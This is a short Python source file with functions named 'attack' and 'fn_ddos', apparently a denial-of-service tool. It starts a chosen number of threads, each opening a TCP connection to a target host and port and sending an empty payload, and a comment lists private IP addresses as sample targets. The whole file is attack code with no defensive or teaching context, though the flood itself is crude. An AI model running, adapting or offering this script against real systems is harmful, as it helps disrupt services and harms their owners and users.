import socket
import threading

def attack(target, port=80):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((target, port))
    s.sendto(b"", (target, port))
    s.close()

def fn_ddos(target, threads, port=80):
    # target = '172.16.80.11' #'172.16.80.38' 
    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=attack, args=(target, port))
        t.start()
        threads_list.append(t)
    for t in threads_list:
        t.join()